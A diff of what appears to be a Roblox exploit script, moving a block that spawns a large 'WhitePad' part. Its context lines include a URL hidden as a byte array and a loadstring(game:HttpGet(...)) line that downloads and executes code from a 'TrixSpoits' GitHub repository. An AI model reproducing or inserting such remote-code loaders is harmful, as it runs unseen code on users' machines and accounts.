@@ -197,14 +197,7 @@
 
 
 
-local pad = Instance.new("Part")
-pad.Size = Vector3.new(10000, 1, 10000)
-pad.Position = Vector3.new(0, -45, 0)
-pad.Anchored = true
-pad.Color = Color3.fromRGB(255, 255, 255)
-pad.Transparency = 0.5
-pad.Name = "WhitePad"
-pad.Parent = game.Workspace
+
 
 local url_bytes = {
   104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
@@ -262,3 +255,12 @@ if player and player.Character then
 end
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/erasedDiablo/TrixSpoits/refs/heads/main/DiscordServer"))()
+
+local pad = Instance.new("Part")
+pad.Size = Vector3.new(10000, 1, 10000)
+pad.Position = Vector3.new(0, -45, 0)
+pad.Anchored = true
+pad.Color = Color3.fromRGB(255, 255, 255)
+pad.Transparency = 0.5
+pad.Name = "WhitePad"
+pad.Parent = game.Workspace
